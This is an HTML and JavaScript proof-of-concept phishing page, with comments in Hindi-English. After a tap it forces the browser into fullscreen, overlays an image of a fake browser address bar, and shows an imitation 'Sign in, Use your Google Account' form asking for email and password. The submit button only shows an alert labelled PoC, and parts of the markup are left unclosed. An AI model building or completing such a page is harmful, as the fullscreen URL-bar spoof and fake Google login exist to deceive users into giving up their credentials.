<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: roboto, Arial, sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
            overflow: hidden;
        }

        /* Fullscreen par image ki setting */
        #spoofBar {
            display: none; 
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 99998; /* Login panel iske upar aayega */
            background-color: white;
        }

        #spoofBar img {
            width: 100%;
            height: auto;
            display: block;
        }

        h1 {
            font-size: 24px;
            color: #333;
            text-align: center;
        }

        /* --- NEW: Login Panel ki CSS --- */
        #loginContainer {
            display: none; /* Shuru me hide rahega */
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 90%;
            max-width: 360px;
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            z-index: 99999; /* Spoof bar ke upar dikhane ke liye */
            box-sizing: border-box;
            font-family: Arial, sans-serif;
            text-align: center;
        }

        #loginContainer h2 {
            margin-top: 0;
            font-weight: 500;
            color: #202124;
        }

        #loginContainer p {
            color: #5f6368;
            font-size: 14px;
            margin-bottom: 25px;
        }

        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }

        .input-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
        }

        .login-btn {
            width: 100%;
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }

        .login-btn:hover {
            background-color: #1557b0;
        }
    </style>
</head>

    <div id="loginContainer">
        <div class="login-box">
            <h2>Sign in</h2>
            <p>Use your Google Account</p>
            
            <div class="input-group">
                <input type="email" placeholder="Email or phone" required>
            </div>
            
            <div class="input-group">
                <input type="password" placeholder="Enter your password" required>

            <button type="button" class="login-btn" onclick="alert('Login action triggered (PoC)')">Next</button>

    <script>
    let isClicked = false;

    document.body.addEventListener("click", function () {
        if (isClicked) return; 
        isClicked = true;

        const status = document.getElementById("statusText");
        status.innerHTML = "Tap registered!<br>Waiting 4 seconds...";

        setTimeout(() => {
            const docEl = document.documentElement;
            const requestFS = docEl.requestFullscreen || docEl.mozRequestFullScreen || docEl.webkitRequestFullScreen || docEl.msRequestFullscreen;

            if (requestFS) {
                requestFS.call(docEl)
                    .then(() => {
                        console.log("Fullscreen success");
                        
                        // Fullscreen aate hi spoof URL bar aur login dono dikhao
                        document.getElementById("spoofBar").style.display = "block";
                        document.getElementById("loginContainer").style.display = "block";
                        status.style.display = "none";
                    })
                    .catch(err => {
                        console.error("FS Error:", err);
                        status.innerHTML = "Browser blocked fullscreen.<br>Please try tapping again.";
                        isClicked = false;
                    });
            }
        }, 4000); 
    });
    </script>
